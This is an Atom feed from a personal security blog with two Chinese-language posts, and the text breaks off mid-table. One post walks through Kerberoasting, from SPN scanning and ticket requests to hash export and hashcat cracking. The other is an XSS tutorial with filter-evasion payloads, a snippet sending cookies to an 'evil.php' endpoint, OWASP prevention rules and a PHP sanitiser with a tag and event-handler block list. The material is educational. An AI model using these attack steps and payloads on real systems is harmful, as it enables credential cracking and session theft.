<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ru0</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ruos.org/"/>
  <updated>2017-11-01T06:15:10.914Z</updated>
  <id>http://ruos.org/</id>
  
  <author>
    <name>ruo</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SPNs</title>
    <link href="http://ruos.org/2017/11/01/SPNs/"/>
    <id>http://ruos.org/2017/11/01/SPNs/</id>
    <published>2017-11-01T06:12:47.000Z</published>
    <updated>2017-11-01T06:15:10.914Z</updated>
    
    <content type="html"><![CDATA[<p>首先了解一下Kerberos认证协议</p><p>Kerberos Overview &amp; Communication Process:</p><p><img src="https://www.ibm.com/developerworks/cn/data/library/techarticles/dm-0809govindarajan/image001.gif" alt=""></p><p>KDC（Key Distribution Center）有两个服务组成：身份验证服务（Authentication Server，简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。</p><p>User logs on with username &amp; password.</p><p>客户端认证</p><ol><li>客户端将用户id明文消息发送到AS。</li><li>AS返回使用客户端用户密码加密的会话密钥session key和使用krbegt密码加密的TGT。</li><li>客户端使用用户密码解密消息获得会话密钥，该会话密钥用于与TGS的进一步通信。</li></ol><p>客户服务授权</p><ol><li>客户端发送TGT和用Client/TGS会话密钥加密的认证器。</li><li>TGS解密TGT获得会话密钥并用此密钥解密认证器，如果id匹配则返回使用服务密码加密的客户端到服务器的票据和使用Client/TGS会话密钥加密的客户端/服务器会话密钥session key2。</li></ol><p>客户服务请求</p><ol><li>客户端发送一个用session key2加密的新的Authenticator和服务票据。</li><li>服务器用自己密码解密服务票据并提供服务。</li></ol><h3 id="Service-Principal-Names"><a href="#Service-Principal-Names" class="headerlink" title="Service Principal Names"></a>Service Principal Names</h3><p>服务主体名称 (SPN) 是服务实例的唯一标识符。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。以为MSSQL服务配置SPN为例。<br><a href="https://technet.microsoft.com/zh-cn/library/bb735885.aspx" target="_blank" rel="external">https://technet.microsoft.com/zh-cn/library/bb735885.aspx</a></p><a id="more"></a><p>S1. 为 SQL Server 服务帐户注册SPN。</p><p>手动注册<br>setspn -A MSSQLSvc/myhost.redmond.microsoft.com:1433 accountname<br>对于命名实例<br>setspn -A MSSQLSvc/myhost.redmond.microsoft.com/instancename accountname  </p><p>查看用户对应的SPN<br><code>setspn -L ruos\sql-service</code></p><p>使用ADSI（adsiedit.msc）查看用户属性</p><p><img src="https://i.imgur.com/bayB8a4.png" alt=""></p><p>S2. 在AD上为用户指定服务登陆权限。</p><p>GPO_name\Computer Configuration\Windows Settings\Security Settings\Local Policies\User Rights Assignment<br>Log on as a service</p><p><img src="https://i.imgur.com/8o7zha7.png" alt=""></p><p>S3. 更改 SQL Server 服务帐户为域用户帐户。</p><h3 id="暴力破解Kerberos-TGS-Tickets"><a href="#暴力破解Kerberos-TGS-Tickets" class="headerlink" title="暴力破解Kerberos TGS Tickets"></a>暴力破解Kerberos TGS Tickets</h3><p>由于加密类型是RC4_HMAC_MD5，Kerberos协议第四步TGS-REP将会返回用服务帐户的NTLM密码哈希加密的票据。</p><p>S1. SPN扫描</p><p><code>setspn -T domain -q */*</code></p><p>或者<br><a href="https://github.com/PyroTek3/PowerShell-AD-Recon/" target="_blank" rel="external">https://github.com/PyroTek3/PowerShell-AD-Recon/</a></p><p><img src="https://i.imgur.com/56AHj7q.png" alt=""></p><p>S2. 请求SPN Kerberos Tickets<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">PS C:\&gt; <span class="built_in">Add-Type</span> -AssemblyName System.IdentityModel</div><div class="line">PS C:\&gt; <span class="built_in">New-Object</span> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList <span class="string">"MSSQLSvc/WEBTST01.ruos.org/SQLEXPRESS"</span></div></pre></td></tr></table></figure></p><p>S3. 查看并导出票据</p><p><img src="https://i.imgur.com/qvvPXcA.png" alt=""></p><blockquote><p>默认配置加密类型是aes256_hmac，tgsrepcrack无法破解，可在服务器组策略指定加密类型为RC4_HMAC_MD5。<br>GPO_name\Computer Configuration\Windows Settings\Security Settings\Local Policies\Security Options<br>Network security: Configure encryption types allowed for Kerberos</p></blockquote><p>S4. 离线破解</p><p>tgsrepcrack（仅对RC4_HMAC_MD5）,或者保存hash使用hashcat破解。</p><p><img src="https://i.imgur.com/o8WPRlS.png" alt=""></p><p>S1.导出hash(用于其他加密类型)<br>GetUserSPNs.py -request -outputfile hash.txt -dc-ip 192.168.6.2 ruos.org/user2<br>或者从票据中导出 kirbi2john.py 1-40a00000-user2@MSSQLSvc~WEBTST01.ruos.org~SQLEXPRESS-RUOS.ORG.kirbi<br>S2. hashcat64.exe -m 13100 hash.txt example.dict –force</p><p><a href="https://github.com/nidem/kerberoast" target="_blank" rel="external">https://github.com/nidem/kerberoast</a><br><a href="https://github.com/coresecurity/impacket" target="_blank" rel="external">https://github.com/coresecurity/impacket</a><br><a href="https://github.com/nidem/kerberoast/blob/master/kirbi2john.py" target="_blank" rel="external">https://github.com/nidem/kerberoast/blob/master/kirbi2john.py</a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p><a href="https://msdn.microsoft.com/zh-cn/library/windows/apps/dn194200(v=sql.110).aspx" target="_blank" rel="external">https://msdn.microsoft.com/zh-cn/library/windows/apps/dn194200(v=sql.110).aspx</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先了解一下Kerberos认证协议&lt;/p&gt;
&lt;p&gt;Kerberos Overview &amp;amp; Communication Process:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.ibm.com/developerworks/cn/data/library/techarticles/dm-0809govindarajan/image001.gif&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;KDC（Key Distribution Center）有两个服务组成：身份验证服务（Authentication Server，简称AS）和票据授予服务（Ticket Granting Server，简称TGS）。&lt;/p&gt;
&lt;p&gt;User logs on with username &amp;amp; password.&lt;/p&gt;
&lt;p&gt;客户端认证&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户端将用户id明文消息发送到AS。&lt;/li&gt;
&lt;li&gt;AS返回使用客户端用户密码加密的会话密钥session key和使用krbegt密码加密的TGT。&lt;/li&gt;
&lt;li&gt;客户端使用用户密码解密消息获得会话密钥，该会话密钥用于与TGS的进一步通信。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;客户服务授权&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户端发送TGT和用Client/TGS会话密钥加密的认证器。&lt;/li&gt;
&lt;li&gt;TGS解密TGT获得会话密钥并用此密钥解密认证器，如果id匹配则返回使用服务密码加密的客户端到服务器的票据和使用Client/TGS会话密钥加密的客户端/服务器会话密钥session key2。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;客户服务请求&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;客户端发送一个用session key2加密的新的Authenticator和服务票据。&lt;/li&gt;
&lt;li&gt;服务器用自己密码解密服务票据并提供服务。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&quot;Service-Principal-Names&quot;&gt;&lt;a href=&quot;#Service-Principal-Names&quot; class=&quot;headerlink&quot; title=&quot;Service Principal Names&quot;&gt;&lt;/a&gt;Service Principal Names&lt;/h3&gt;&lt;p&gt;服务主体名称 (SPN) 是服务实例的唯一标识符。Kerberos身份验证使用SPN将服务实例与服务登录帐户相关联。以为MSSQL服务配置SPN为例。&lt;br&gt;&lt;a href=&quot;https://technet.microsoft.com/zh-cn/library/bb735885.aspx&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://technet.microsoft.com/zh-cn/library/bb735885.aspx&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="http://ruos.org/2015/04/08/XSS/"/>
    <id>http://ruos.org/2015/04/08/XSS/</id>
    <published>2015-04-08T14:56:29.000Z</published>
    <updated>2017-11-03T03:56:11.924Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cross-site-Scripting-XSS-跨站脚本"><a href="#Cross-site-Scripting-XSS-跨站脚本" class="headerlink" title="Cross-site Scripting (XSS) 跨站脚本"></a>Cross-site Scripting (XSS) 跨站脚本</h1><p>恶意代码注入</p><h4 id="XSS-using-Script-in-Attributes"><a href="#XSS-using-Script-in-Attributes" class="headerlink" title="XSS using Script in Attributes"></a>XSS using Script in Attributes</h4><p>XSS attacks may be conducted without using <script></script> tags. Other tags will do exactly the same thing, for example:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">test1</span>')&gt;</span></div></pre></td></tr></table></figure></p><p>or other attributes like: onmouseover, onerror.<br>onmouseover<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">b</span> <span class="attr">onmouseover</span>=<span class="string">alert(</span>'<span class="attr">Wufff</span>!')&gt;</span>click me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></div></pre></td></tr></table></figure></p><p>onerror<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://url.to.file.which/not.exist"</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie);</span>&gt;</span></div></pre></td></tr></table></figure></p><h4 id="XSS-using-Script-Via-Encoded-URI-Schemes"><a href="#XSS-using-Script-Via-Encoded-URI-Schemes" class="headerlink" title="XSS using Script Via Encoded URI Schemes"></a>XSS using Script Via Encoded URI Schemes</h4><p>使用编码绕过过滤 如:a=&amp;#X41 (UTF-8)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">j&amp;#X41vascript:alert(</span>'<span class="attr">test2</span>')&gt;</span></div></pre></td></tr></table></figure></p><h4 id="XSS-using-code-encoding"><a href="#XSS-using-code-encoding" class="headerlink" title="XSS using code encoding"></a>XSS using code encoding</h4><p>We may encode our script in base64 and place it in META tag.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">"refresh"</span> <span class="attr">CONTENT</span>=<span class="string">"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg"</span>&gt;</span></div></pre></td></tr></table></figure><p>伪协议<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p><h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><p>获取用户cookies</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">var adr = '../evil.php?cakemonster=' + escape(document.cookie);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></div></pre></td></tr></table></figure><a id="more"></a><h2 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h2><p>隐蔽性高</p><h2 id="DOM（Document-Object-Model）-XSS"><a href="#DOM（Document-Object-Model）-XSS" class="headerlink" title="DOM（Document Object Model） XSS"></a>DOM（Document Object Model） XSS</h2><p>动态修改html页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">document.write(document.location.href.substring(document.location.href.indexOf("default=")+8));</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div></pre></td></tr></table></figure><p>The malicious script can be embedded in the URL as follows in two ways:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://www.some.site/page.html?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div><div class="line">or </div><div class="line">http://www.some.site/page.html#default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</div></pre></td></tr></table></figure><p>浏览器防护（自动URL编码）<br>%3Cscript%3Ealert(document.cookie)%3C/script%3E</p><h3 id="XSS-Ajax提交表单getshell"><a href="#XSS-Ajax提交表单getshell" class="headerlink" title="XSS Ajax提交表单getshell"></a>XSS Ajax提交表单getshell</h3><h2 id="XSS-Cross-Site-Scripting-Prevention-Cheat-Sheet"><a href="#XSS-Cross-Site-Scripting-Prevention-Cheat-Sheet" class="headerlink" title="XSS (Cross Site Scripting) Prevention Cheat Sheet"></a>XSS (Cross Site Scripting) Prevention Cheat Sheet</h2><p><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" target="_blank" rel="external">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></p><ol><li>仔细验证不可信数据</li><li>HTML实体编码 You MUST use the escape syntax for the part of the HTML document you’re putting untrusted data into.</li></ol><h4 id="XSS-Prevention-Rules"><a href="#XSS-Prevention-Rules" class="headerlink" title="XSS Prevention Rules"></a>XSS Prevention Rules</h4><p>RULE #0 don’t put untrusted data into your HTML document<br>RULE #1 HTML Escape<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&amp; --&gt; &amp;amp;</div><div class="line">&lt; --&gt; &amp;lt;</div><div class="line">&gt; --&gt; &amp;gt;</div><div class="line">&quot; --&gt; &amp;quot;</div><div class="line">&apos; --&gt; &amp;#x27;     &amp;apos; is in the XML and XHTML specs.</div><div class="line">/ --&gt; &amp;#x2F;     forward slash is included as it helps end an HTML entity</div></pre></td></tr></table></figure></p><p>RULE #2 - Attribute Escape<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"fname"</span> <span class="attr">value</span>=<span class="string">"UNTRUSTED DATA"</span>&gt;</span></div></pre></td></tr></table></figure></p><p>RULE #3 - JavaScript Escape<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;var currentValue=&apos;UNTRUSTED DATA&apos;;&lt;/script&gt;</div><div class="line">&lt;script&gt;someFunction(&apos;UNTRUSTED DATA&apos;);&lt;/script&gt; </div><div class="line"></div><div class="line">//编码</div><div class="line">&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt; </div><div class="line">&amp;lt;SCRIPT&amp;gt;alert&amp;#x28;&amp;quot;XSS&amp;quot;&amp;#x29;&amp;lt;&amp;#x2f;SCRIPT&amp;gt;</div></pre></td></tr></table></figure></p><ul><li>Ensure JavaScript variables are quoted</li><li>JavaScript Hex Encoding</li><li>JavaScript Unicode Encoding</li><li>Avoid backslash encoding (\” or \’ or \)</li></ul><p>RULE #4 - CSS Escape And Strictly Validate<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width: UNTRUSTED DATA;"</span>&gt;</span>Selection<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p><ul><li>CSS Hex encoding</li></ul><p>Except for alphanumeric characters, escape all characters with ASCII values less than 256 with the \HH escaping format.<br>RULE #5 - URL Escape<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a href=<span class="string">"/site/search?value=&lt;?php echo urlencode($_GET['url']) ?&gt;"</span>&gt;clickme&lt;/a&gt;</div></pre></td></tr></table></figure></p><p>RULE #6 - Sanitize HTML Markup<br>PHP Html Purifier - <a href="http://htmlpurifier.org/" target="_blank" rel="external">http://htmlpurifier.org/</a><br>RULE #7 - Prevent DOM-based XSS</p><p>Others<br>Use HTTPOnly cookie flag</p><p>Code Filter</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">RemoveXSS</span><span class="params">($val)</span> </span>&#123; </div><div class="line">    <span class="comment">// remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed </span></div><div class="line">    <span class="comment">// this prevents some character re-spacing such as &lt;java\0script&gt; </span></div><div class="line">    <span class="comment">// note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some          // inputs </span></div><div class="line">    $val = preg_replace(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>, <span class="string">''</span>, $val); </div><div class="line">     </div><div class="line">    <span class="comment">// straight replacements, the user should never need these since they're normal characters </span></div><div class="line">    <span class="comment">// this prevents like &lt;IMG SRC=@avascript:alert('XSS')&gt; </span></div><div class="line">    $search = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span>; </div><div class="line">    $search .= <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>; </div><div class="line">    $search .= <span class="string">'1234567890!@#$%^&amp;*()'</span>; </div><div class="line">    $search .= <span class="string">'~`";:?+/=&#123;&#125;[]-_|\'\\'</span>; </div><div class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($search); $i++) &#123; </div><div class="line">        <span class="comment">// ;? matches the ;, which is optional </span></div><div class="line">        <span class="comment">// 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars </span></div><div class="line"> </div><div class="line">        <span class="comment">// @ @ search for the hex values </span></div><div class="line">        $val = preg_replace(<span class="string">'/(&amp;#[xX]0&#123;0,8&#125;'</span>.dechex(ord($search[$i])).<span class="string">';?)/i'</span>, $search[$i], $val);<span class="comment">//with a ; </span></div><div class="line">        <span class="comment">// @ @ 0&#123;0,7&#125; matches '0' zero to seven times </span></div><div class="line">        $val = preg_replace(<span class="string">'/(&amp;#0&#123;0,8&#125;'</span>.ord($search[$i]).<span class="string">';?)/'</span>, $search[$i], $val); <span class="comment">// with a ; </span></div><div class="line">    &#125; </div><div class="line"> </div><div class="line">    <span class="comment">// now the only remaining whitespace attacks are \t, \n, and \r </span></div><div class="line">    $ra1 = <span class="keyword">Array</span>(<span class="string">'javascript'</span>, <span class="string">'vbscript'</span>, <span class="string">'expression'</span>, <span class="string">'applet'</span>, <span class="string">'meta'</span>, <span class="string">'xml'</span>, <span class="string">'blink'</span>, <span class="string">'link'</span>, <span class="string">'style'</span>, <span class="string">'script'</span>, <span class="string">'embed'</span>, <span class="string">'object'</span>, <span class="string">'iframe'</span>, <span class="string">'frame'</span>, <span class="string">'frameset'</span>, <span class="string">'ilayer'</span>, <span class="string">'layer'</span>, <span class="string">'bgsound'</span>, <span class="string">'title'</span>, <span class="string">'base'</span>); </div><div class="line">    $ra2 = <span class="keyword">Array</span>(<span class="string">'onabort'</span>, <span class="string">'onactivate'</span>, <span class="string">'onafterprint'</span>, <span class="string">'onafterupdate'</span>, <span class="string">'onbeforeactivate'</span>, <span class="string">'onbeforecopy'</span>, <span class="string">'onbeforecut'</span>, <span class="string">'onbeforedeactivate'</span>, <span class="string">'onbeforeeditfocus'</span>, <span class="string">'onbeforepaste'</span>, <span class="string">'onbeforeprint'</span>, <span class="string">'onbeforeunload'</span>, <span class="string">'onbeforeupdate'</span>, <span class="string">'onblur'</span>, <span class="string">'onbounce'</span>, <span class="string">'oncellchange'</span>, <span class="string">'onchange'</span>, <span class="string">'onclick'</span>, <span class="string">'oncontextmenu'</span>, <span class="string">'oncontrolselect'</span>, <span class="string">'oncopy'</span>, <span class="string">'oncut'</span>, <span class="string">'ondataavailable'</span>, <span class="string">'ondatasetchanged'</span>, <span class="string">'ondatasetcomplete'</span>, <span class="string">'ondblclick'</span>, <span class="string">'ondeactivate'</span>, <span class="string">'ondrag'</span>, <span class="string">'ondragend'</span>, <span class="string">'ondragenter'</span>, <span class="string">'ondragleave'</span>, <span class="string">'ondragover'</span>, <span class="string">'ondragstart'</span>, <span class="string">'ondrop'</span>, <span class="string">'onerror'</span>, <span class="string">'onerrorupdate'</span>, <span class="string">'onfilterchange'</span>, <span class="string">'onfinish'</span>, <span class="string">'onfocus'</span>, <span class="string">'onfocusin'</span>, <span class="string">'onfocusout'</span>, <span class="string">'onhelp'</span>, <span class="string">'onkeydown'</span>, <span class="string">'onkeypress'</span>, <span class="string">'onkeyup'</span>, <span class="string">'onlayoutcomplete'</span>, <span class="string">'onload'</span>, <span class="string">'onlosecapture'</span>, <span class="string">'onmousedown'</span>, <span class="string">'onmouseenter'</span>, <span class="string">'onmouseleave'</span>, <span class="string">'onmousemove'</span>, <span class="string">'onmouseout'</span>, <span class="string">'onmouseover'</span>, <span class="string">'onmouseup'</span>, <span class="string">'onmousewheel'</span>, <span class="string">'onmove'</span>, <span class="string">'onmoveend'</span>, <span class="string">'onmovestart'</span>, <span class="string">'onpaste'</span>, <span class="string">'onpropertychange'</span>, <span class="string">'onreadystatechange'</span>, <span class="string">'onreset'</span>, <span class="string">'onresize'</span>, <span class="string">'onresizeend'</span>, <span class="string">'onresizestart'</span>, <span class="string">'onrowenter'</span>, <span class="string">'onrowexit'</span>, <span class="string">'onrowsdelete'</span>, <span class="string">'onrowsinserted'</span>, <span class="string">'onscroll'</span>, <span class="string">'onselect'</span>, <span class="string">'onselectionchange'</span>, <span class="string">'onselectstart'</span>, <span class="string">'onstart'</span>, <span class="string">'onstop'</span>, <span class="string">'onsubmit'</span>, <span class="string">'onunload'</span>); </div><div class="line">    $ra = array_merge($ra1, $ra2); </div><div class="line">    </div><div class="line">    $found = <span class="keyword">true</span>; <span class="comment">// keep replacing as long as the previous round replaced something </span></div><div class="line">    <span class="keyword">while</span> ($found == <span class="keyword">true</span>) &#123; </div><div class="line">        $val_before = $val; </div><div class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; sizeof($ra); $i++) &#123; </div><div class="line">            $pattern = <span class="string">'/'</span>; </div><div class="line">            <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($ra[$i]); $j++) &#123; </div><div class="line">                <span class="keyword">if</span> ($j &gt; <span class="number">0</span>) &#123; </div><div class="line">                    $pattern .= <span class="string">'('</span>; </div><div class="line">                    $pattern .= <span class="string">'(&amp;#[xX]0&#123;0,8&#125;([9ab]);)'</span>; </div><div class="line">                    $pattern .= <span class="string">'|'</span>; </div><div class="line">                    $pattern .= <span class="string">'|(&amp;#0&#123;0,8&#125;([9|10|13]);)'</span>; </div><div class="line">                    $pattern .= <span class="string">')*'</span>; </div><div class="line">                &#125; </div><div class="line">                $pattern .= $ra[$i][$j]; </div><div class="line">            &#125; </div><div class="line">            $pattern .= <span class="string">'/i'</span>; </div><div class="line">            $replacement = substr($ra[$i], <span class="number">0</span>, <span class="number">2</span>).<span class="string">'&lt;x&gt;'</span>.substr($ra[$i], <span class="number">2</span>); <span class="comment">// add in &lt;&gt; to nerf the tag </span></div><div class="line">            $val = preg_replace($pattern, $replacement, $val); <span class="comment">// filter out the hex tags </span></div><div class="line">            <span class="keyword">if</span> ($val_before == $val) &#123; </div><div class="line">                <span class="comment">// no replacements were made, so exit the loop </span></div><div class="line">                $found = <span class="keyword">false</span>; </div><div class="line">            &#125; </div><div class="line">        &#125; </div><div class="line">    &#125; </div><div class="line">    <span class="keyword">return</span> $val; </div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="XSS-Filter-Evasion"><a href="#XSS-Filter-Evasion" class="headerlink" title="XSS Filter Evasion"></a>XSS Filter Evasion</h2><p><a href="https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="external">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p><ul><li>XSS Platform</li><li>XSS 编码</li><li>OWASP XSSER</li></ul><ol><li>编码</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">URL编码 空格（%20）</div><div class="line">HTML实体编码 &lt; (&amp;lt;)</div><div class="line">字符编码 十进制、十六进制ASCII码或unicode字符编码 &lt; (&amp;#60;)  &gt;(&amp;#62;)</div><div class="line">Js编码 &lt; (u003c) &gt;(u003e)</div><div class="line">CSS编码 \65</div></pre></td></tr></table></figure><p>HTML实体编码</p><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br>    <tr><br>      <th style="width:20%">显示结果</th><br>      <th style="width:20%">描述</th><br>      <th style="width:30%">实体名称</th><br>      <th style="width:30%">实体编号</th><br>    </tr><br>    <tr><br>      <td>&nbsp;</td><br>      <td>空格</td><br>      <td>&amp;nbsp;</td><br>      <td>&amp;#160;</td><br>    </tr><br>    <tr><br>      <td>&lt;</td><br>      <td>小于号</td><br>      <td>&amp;lt;</td><br>      <td>&amp;#60;</td><br>    </tr><br>    <tr><br>      <td>&gt;</td><br>      <td>大于号</td><br>      <td>&amp;gt;</td><br>      <td>&amp;#62;</td><br>    </tr><br>    <tr><br>      <td>&amp;</td><br>      <td>和号</td><br>      <td>&amp;amp;</td><br>      <td>&amp;#38;</td><br>    </tr><br>    <tr><br>      <td>“</td><br>      <td>引号</td><br>      <td>&amp;quot;</td><br>      <td>&amp;#34;</td><br>    </tr><br>    <tr><br>      <td>‘</td><br>      <td>撇号&nbsp;</td><br>      <td>&amp;apos; (IE不支持)</td><br>      <td>&amp;#39;</td><br>    </tr><br></tbody><br></table><p>Unicode编码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"javascript:alert(/xss/)"</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#47;&amp;#41;"</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure></p><ol><li>单引号</li></ol><p><code>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</code></p><ol><li>其他</li></ol><p>使用tab键空开<br><code>&lt;IMG SRC=&quot;jav    ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>编码tab<br><code>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>使用制表符, 换行符和回车符</p><blockquote><p>加入新行;&#10; Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. </p></blockquote><p><code>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&#39;XSS&#39;);&quot;&gt;</code></p><table border="0" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td>Type</td><br><td>Horizontal&nbsp;Tab</td><br><td>New 